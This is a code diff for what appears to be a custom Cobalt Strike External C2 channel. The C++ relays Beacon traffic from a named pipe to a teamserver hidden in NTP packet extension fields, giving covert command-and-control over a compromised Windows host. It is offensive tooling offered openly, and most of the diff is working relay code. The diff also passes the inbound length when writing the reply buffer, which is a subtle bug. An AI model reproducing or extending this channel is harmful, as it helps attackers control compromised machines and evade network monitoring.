@@ -204,6 +204,7 @@ std::vector<uint8_t> getId() {
 // =====================================
 #define PAYLOAD_MAX_SIZE 512 * 1024
 #define BUFFER_MAX_SIZE 1024 * 1024
+#include <windows.h>
 
 //NOTE still need to setup server side and make sure that logic lines up
 
@@ -229,8 +230,7 @@ void write_frame(HANDLE my_handle, char* buffer, DWORD length) {
 	WriteFile(my_handle, buffer, length, &wrote, NULL);
 }
 
-#include <windows.h>
-void pipeStuff() {
+void pipeStuff(std::vector<uint8_t> clientId) {
 	//again pulled from https://github.com/Cobalt-Strike/External-C2/blob/main/extc2example.c
 	HANDLE handle_beacon = INVALID_HANDLE_VALUE;
 	while (handle_beacon == INVALID_HANDLE_VALUE) {
@@ -249,14 +249,29 @@ void pipeStuff() {
 		/* read from our named pipe Beacon */
 		DWORD read = read_frame(handle_beacon, buffer, BUFFER_MAX_SIZE);
 		if (read < 0) {
-			break;
+			std::cerr << "Error reading from pipe" << std::endl;
+			return;
 		}
 
-		//send back to NTP (chunker)
-		//recv from data (again from chunker)
+		// Create a vector from the char* data as the NTP class needs it, readis how much data was read. 
+		std::vector<uint8_t> vec(buffer, buffer + read);
+
+		//send with chunker
+		std::vector<uint8_t> dataFromTeamserver = chunker(
+			vec,
+			NtpExtensionField::dataForTeamserver,
+			clientId
+		);
+
+		//extract data out from chunker response
+		NTPPacketParser dataFromTeamserverClass(dataFromTeamserver);
+		auto dataForBeaconVec = dataFromTeamserverClass.getExtensionData();
+
+		//convert to const char * as that's what write_frame wants
+		auto dataForBeacon = reinterpret_cast<char*>(dataForBeaconVec.data());
 
 		/* write to our named pipe Beacon */
-		write_frame(handle_beacon, buffer, read);
+		write_frame(handle_beacon, dataForBeacon, read);
 	}
 }
 
@@ -278,7 +293,7 @@ int main() {
 	//3. read from pipe & start with chunk loop
 	std::cout << "[>] Pipe Loop Started" << std::endl;
 
-	pipeStuff();
+	pipeStuff(clientId);
 
 
 	std::cout << "[+] Finished!" << std::endl;
